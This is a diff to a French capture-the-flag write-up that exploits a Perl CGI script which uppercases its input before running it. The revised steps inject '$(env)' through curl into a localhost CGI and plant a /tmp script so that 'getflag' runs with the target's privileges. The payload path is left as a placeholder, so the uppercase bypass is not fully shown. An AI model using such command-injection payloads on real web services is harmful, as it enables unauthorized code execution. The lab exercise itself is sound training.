@@ -20,35 +20,32 @@ Comme le script est exécuté avec les droits de `flag12`, notre commande le ser
 
 ## Exploitation
 
-On crée un script contenant la commande à exécuter :
+Le script Perl convertit le paramètre en majuscules avant de l'exécuter. En utilisant la substitution de commande du shell, il est possible d'exécuter du code malgré cette conversion.
 
-TODO
-
-```bash
-echo 'getflag > /tmp/flag' > /tmp/GETFLAG
-chmod +x /tmp/GETFLAG
-```
-
-On ajoute `/tmp` au `PATH` :
+On peut d'abord inspecter l'environnement via le CGI du niveau précédent (port 4747) :
 
 ```bash
-export PATH=/tmp:$PATH
+curl -s 'http://localhost:4747?x=$(env)'
 ```
 
-On envoie ensuite une requête contenant :
-
-```text
-`getflag`
-```
-
-(ou le nom du script créé, selon la méthode utilisée)
-
-Le script exécute notre commande.
-
-On récupère ensuite le résultat :
+On crée ensuite un script qui exécute `getflag` et on l'injecte via le CGI du niveau 12 (port 4646) :
 
 ```bash
-cat /tmp/flag
+echo '#!/bin/bash
+getflag > /tmp/level12.flag' > /tmp/level12.sh
+chmod +x /tmp/level12.sh
+```
+
+On envoie la requête avec le chemin vers notre script :
+
+```bash
+curl -s 'http://localhost:4646?x=<chemin_vers_script>'
+```
+
+Le script exécute notre commande. On récupère ensuite le résultat :
+
+```bash
+cat /tmp/level12.flag
 ```
 
 Résultat :
